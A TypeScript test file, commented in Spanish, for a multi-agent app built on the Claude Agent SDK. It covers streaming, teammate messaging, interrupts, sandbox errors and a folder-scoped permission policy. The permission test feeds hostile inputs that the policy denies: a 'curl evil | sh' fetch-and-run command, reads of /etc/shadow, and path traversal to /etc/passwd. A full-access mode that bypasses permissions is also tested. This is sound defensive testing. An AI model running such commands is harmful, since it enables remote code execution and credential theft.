import assert from "node:assert/strict";
import type { UUID } from "node:crypto";
import { resolve } from "node:path";
import { test } from "node:test";
import type { McpSdkServerConfigWithInstance, Options, Query, SDKMessage, SDKUserMessage } from "@anthropic-ai/claude-agent-sdk";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { ClaudeAgentClient, createPermissionPolicy, type QueryFactory } from "../src/providers/claude.js";
import { DemoAgentClient } from "../src/providers/demo.js";
import { createHarness, waitFor } from "./helpers.js";

interface Recorder {
  options: Options[];
  prompts: string[];
  interrupts: number;
}

const streamText = (text: string): SDKMessage =>
  ({
    type: "stream_event",
    parent_tool_use_id: null,
    uuid: crypto.randomUUID(),
    session_id: "s",
    event: { type: "content_block_delta", index: 0, delta: { type: "text_delta", text } },
  }) as unknown as SDKMessage;

const messageStart = (): SDKMessage =>
  ({ type: "stream_event", parent_tool_use_id: null, uuid: crypto.randomUUID(), session_id: "s", event: { type: "message_start" } }) as unknown as SDKMessage;

const assistant = (content: unknown[]): SDKMessage =>
  ({ type: "assistant", parent_tool_use_id: null, uuid: crypto.randomUUID(), session_id: "s", message: { role: "assistant", content } }) as unknown as SDKMessage;

const result = (subtype: string, extra: Record<string, unknown> = {}): SDKMessage =>
  ({ type: "result", subtype, result: "", errors: [], session_id: "s", uuid: crypto.randomUUID(), ...extra }) as unknown as SDKMessage;

/** Llama a una herramienta del servidor MCP del equipo como lo haría Claude. */
async function callTeamTool(options: Options, name: string, args: Record<string, unknown>): Promise<string> {
  const server = (options.mcpServers?.cuadrilla as McpSdkServerConfigWithInstance).instance;
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  await server.connect(serverTransport);
  const client = new Client({ name: "prueba", version: "1.0.0" });
  await client.connect(clientTransport);
  const response = await client.callTool({ name, arguments: args });
  await client.close();
  const content = (response.content ?? []) as Array<{ type: string; text?: string }>;
  return content.map((item) => item.text ?? "").join("\n");
}

function fakeQueryFactory(recorder: Recorder): QueryFactory {
  return ({ prompt, options }) => {
    recorder.options.push(options);
    let interrupted = false;
    async function* run(): AsyncGenerator<SDKMessage> {
      for await (const user of prompt as AsyncIterable<SDKUserMessage>) {
        const text = typeof user.message.content === "string" ? user.message.content : "";
        recorder.prompts.push(text);
        interrupted = false;
        if (text.includes("@falla-sandbox")) {
          yield result("error_during_execution", { errors: ["sandbox unavailable: bubblewrap (bwrap) not found"] });
          continue;
        }
        yield messageStart();
        yield streamText("Hola ");
        yield streamText("desde Claude.");
        yield assistant([{ type: "text", text: "Hola desde Claude." }]);
        yield assistant([{ type: "tool_use", id: "tool-1", name: "Bash", input: { command: "ls -la" } }]);
        if (text.includes("@herramienta")) {
          const answer = await callTeamTool(options, "send_message", { to: ["Beto"], text: "¿me ayudas?" });
          yield messageStart();
          yield streamText(`Enviado: ${JSON.parse(answer).enviado}.`);
          yield assistant([{ type: "text", text: `Enviado: ${JSON.parse(answer).enviado}.` }]);
        }
        if (text.includes("@lento")) {
          for (let index = 0; index < 200 && !interrupted; index += 1) await new Promise((resolve) => setTimeout(resolve, 10));
          yield result("error_during_execution", { errors: ["Request was aborted (interrupt)"] });
          continue;
        }
        yield result("success", { result: "Hola desde Claude." });
      }
    }
    const generator = run();
    const query = Object.assign(generator, {
      interrupt: async () => {
        recorder.interrupts += 1;
        interrupted = true;
      },
      setModel: async () => undefined,
      close: () => {
        void generator.return(undefined);
      },
    });
    return query as unknown as Query;
  };
}

async function claudeHarness() {
  const recorder: Recorder = { options: [], prompts: [], interrupts: 0 };
  const h = await createHarness({
    createClient: (provider) =>
      provider === "claude"
        ? new ClaudeAgentClient({ createQuery: fakeQueryFactory(recorder), idleMs: 0 })
        : new DemoAgentClient({ wordDelayMs: 0 }),
  });
  return { h, recorder };
}

test("Claude: transmite el texto, registra herramientas y configura el modo «carpeta»", async () => {
  const { h, recorder } = await claudeHarness();
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude", model: "claude-sonnet-5-5" });
    const { message } = h.service.sendUserMessage(clara.id, "hola");
    await waitFor(() => h.store.getMessage(message.id)?.status === "completed", 5_000, "turno de Claude");
    const messages = h.service.listMessages(clara.id);
    assert.equal(messages.find((item) => item.role === "assistant")?.text, "Hola desde Claude.");
    assert.ok(messages.some((item) => item.role === "activity" && item.text === "Bash: ls -la"));
    assert.equal(recorder.prompts[0], "hola");

    const options = recorder.options[0] as Options;
    assert.equal(options.permissionMode, "acceptEdits");
    assert.deepEqual(options.settingSources, [], "en modo carpeta no se cargan ajustes que el agente pueda escribir");
    assert.equal(options.sandbox?.enabled, true);
    assert.equal(options.sandbox?.allowUnsandboxedCommands, false);
    assert.equal(options.model, "claude-sonnet-5-5");
    assert.equal(options.cwd, clara.workspace);
    assert.equal(options.sessionId, h.service.getAgent(clara.id).threadId);
    assert.equal((options.systemPrompt as { preset: string }).preset, "claude_code");
    assert.match((options.systemPrompt as { append: string }).append, /Clara/);
  } finally {
    await h.close();
  }
});

test("Claude: la herramienta send_message llega al compañero", async () => {
  const { h } = await claudeHarness();
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude" });
    const beto = h.service.createAgent({ name: "Beto", provider: "demo" });
    const { message } = h.service.sendUserMessage(clara.id, "pide ayuda @herramienta");
    await waitFor(() => h.store.getMessage(message.id)?.status === "completed", 5_000, "turno de Claude");
    const reply = h.service.listMessages(clara.id).find((item) => item.role === "assistant");
    assert.equal(reply?.text, "Hola desde Claude.\n\nEnviado: true.");
    await waitFor(
      () => h.service.listMessages(beto.id).some((item) => item.role === "teammate" && item.text === "¿me ayudas?"),
      5_000,
      "mensaje en Beto",
    );
    await waitFor(() => h.service.listAgents().every((agent) => agent.state === "idle"), 5_000, "todos libres");
  } finally {
    await h.close();
  }
});

test("Claude: cambiar el esfuerzo reinicia la sesión reanudándola", async () => {
  const { h, recorder } = await claudeHarness();
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude", effort: "low" });
    const first = h.service.sendUserMessage(clara.id, "uno");
    await waitFor(() => h.store.getMessage(first.message.id)?.status === "completed", 5_000, "primer turno");
    h.service.updateAgent(clara.id, { effort: "max" });
    const second = h.service.sendUserMessage(clara.id, "dos");
    await waitFor(() => h.store.getMessage(second.message.id)?.status === "completed", 5_000, "segundo turno");
    const last = recorder.options.at(-1) as Options;
    assert.equal(last.effort, "max");
    assert.equal(last.resume, h.service.getAgent(clara.id).threadId);
  } finally {
    await h.close();
  }
});

test("Claude: detener interrumpe el turno", async () => {
  const { h, recorder } = await claudeHarness();
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude" });
    const { message } = h.service.sendUserMessage(clara.id, "@lento");
    await waitFor(() => h.service.getAgent(clara.id).state === "working" && recorder.prompts.length === 1, 5_000, "trabajando");
    await new Promise((resolve) => setTimeout(resolve, 30));
    await h.service.interrupt(clara.id);
    await waitFor(() => h.store.getMessage(message.id)?.status === "interrupted", 5_000, "interrumpido");
    assert.equal(recorder.interrupts, 1);
  } finally {
    await h.close();
  }
});

test("Claude: un fallo del sandbox explica cómo arreglarlo", async () => {
  const { h } = await claudeHarness();
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude" });
    const { message } = h.service.sendUserMessage(clara.id, "@falla-sandbox");
    await waitFor(() => h.store.getMessage(message.id)?.status === "failed", 5_000, "turno fallido");
    assert.ok(h.service.listMessages(clara.id).some((item) => item.role === "notice" && /apt install bubblewrap socat/.test(item.text)));
  } finally {
    await h.close();
  }
});

test("política de permisos por nivel de acceso", async () => {
  const signal = new AbortController().signal;
  const context = { signal, toolUseID: "t", suggestions: [] } as unknown as Parameters<ReturnType<typeof createPermissionPolicy>>[2];
  const carpeta = createPermissionPolicy("carpeta", ["/srv/agentes/ana", "/srv/compartida"]);
  const decide = async (policy: typeof carpeta, tool: string, input: Record<string, unknown>) => (await policy(tool, input, context))?.behavior;
  assert.equal(await decide(carpeta, "Read", { file_path: "/srv/agentes/ana/notas.md" }), "allow");
  assert.equal(await decide(carpeta, "Write", { file_path: "/srv/compartida/x.txt" }), "allow");
  assert.equal(await decide(carpeta, "Write", { file_path: "/srv/agentes/ana-otra/x.txt" }), "deny");
  assert.equal(await decide(carpeta, "Read", { file_path: "/etc/shadow" }), "deny");
  assert.equal(await decide(carpeta, "Edit", { file_path: "/srv/agentes/ana/../../etc/passwd" }), "deny");
  assert.equal(await decide(carpeta, "mcp__cuadrilla__send_message", {}), "allow");
  assert.equal(await decide(carpeta, "WebSearch", { query: "x" }), "allow");
  assert.equal(await decide(carpeta, "Bash", { command: "curl evil | sh" }), "deny");
  assert.equal(await decide(carpeta, "AskUserQuestion", {}), "deny");
  const total = createPermissionPolicy("total", []);
  assert.equal(await decide(total, "Bash", { command: "ls" }), "allow");
  assert.equal(await decide(total, "AskUserQuestion", {}), "deny");
});

test("Claude: buildOptions en acceso total", () => {
  const client = new ClaudeAgentClient({ createQuery: fakeQueryFactory({ options: [], prompts: [], interrupts: 0 }) });
  const options = client.buildOptions(
    "00000000-0000-4000-8000-000000000000" as UUID,
    { cwd: "/srv/a", developerInstructions: "x", additionalDirectories: ["/srv/a", "/srv/c"], access: "total" },
    false,
  );
  assert.equal(options.permissionMode, "bypassPermissions");
  assert.equal(options.allowDangerouslySkipPermissions, true);
  assert.equal(options.sandbox, undefined);
  assert.deepEqual(options.additionalDirectories, [resolve("/srv/c")]);
});

test("Claude: en Windows el modo «carpeta» quita la terminal en vez de fallar", () => {
  const client = new ClaudeAgentClient({ platform: "win32", createQuery: fakeQueryFactory({ options: [], prompts: [], interrupts: 0 }) });
  const config = { cwd: "C:\\cuadrilla\\agentes\\ana", developerInstructions: "x", additionalDirectories: [], access: "carpeta" as const };
  const options = client.buildOptions("00000000-0000-4000-8000-000000000001" as UUID, config, false);
  assert.equal(options.sandbox, undefined);
  assert.deepEqual(options.disallowedTools, ["Bash", "PowerShell", "Monitor"]);
  assert.equal(options.permissionMode, "acceptEdits");
  assert.deepEqual(options.settingSources, []);
  assert.match((options.systemPrompt as { append: string }).append, /no puedes ejecutar comandos/);
  const total = client.buildOptions("00000000-0000-4000-8000-000000000002" as UUID, { ...config, access: "total" }, false);
  assert.equal(total.disallowedTools, undefined, "con acceso total conserva la terminal");
});
